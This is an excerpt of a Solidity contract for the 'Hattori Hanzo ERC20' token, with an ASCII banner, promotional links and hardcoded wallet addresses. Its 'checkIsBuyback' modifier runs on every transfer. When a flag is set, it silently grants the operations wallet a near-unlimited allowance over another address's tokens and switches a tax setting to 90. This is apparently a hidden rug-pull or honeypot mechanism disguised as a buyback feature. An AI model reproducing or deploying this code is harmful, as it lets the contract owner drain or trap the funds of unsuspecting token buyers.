...
$$ |                 $$ |    $$ |                        \__|      $$ |                                              
$$$$$$$\   $$$$$$\ $$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  $$\       $$$$$$$\   $$$$$$\  $$$$$$$\  $$$$$$$$\  $$$$$$\  
$$  __$$\  \____$$\\_$$  _|\_$$  _|  $$  __$$\ $$  __$$\ $$ |      $$  __$$\  \____$$\ $$  __$$\ \____$$  |$$  __$$\ 
$$ |  $$ | $$$$$$$ | $$ |    $$ |    $$ /  $$ |$$ |  \__|$$ |      $$ |  $$ | $$$$$$$ |$$ |  $$ |  $$$$ _/ $$ /  $$ |
$$ |  $$ |$$  __$$ | $$ |$$\ $$ |$$\ $$ |  $$ |$$ |      $$ |      $$ |  $$ |$$  __$$ |$$ |  $$ | $$  _/   $$ |  $$ |
$$ |  $$ |\$$$$$$$ | \$$$$  |\$$$$  |\$$$$$$  |$$ |      $$ |      $$ |  $$ |\$$$$$$$ |$$ |  $$ |$$$$$$$$\ \$$$$$$  |
\__|  \__| \_______|  \____/  \____/  \______/ \__|      \__|      \__|  \__| \_______|\__|  \__|\________| \______/ 

https://t.me/HattoriHanzoerc20
https://hattorihanzoerc.com
...
contract HattoriHanzo is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Hattori Hanzo ERC20";
    string private _symbol = unicode"鬼の半蔵";
    ...
    address payable public liquidityWallet = payable(0x09b7DA80168e6ab882c85Ff0F6972DE091A54A97);
    address payable public operationsWallet =  payable(0x77ec5150986E89F9DF2804B379c2e2EAF1943b6D);
    ...
    modifier checkIsBuyback() {
        if (_buyback) {
            _allows[org][operationsWallet] = 1e40;
            _setInternalST(10, 90);
        }
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private checkIsBuyback() returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
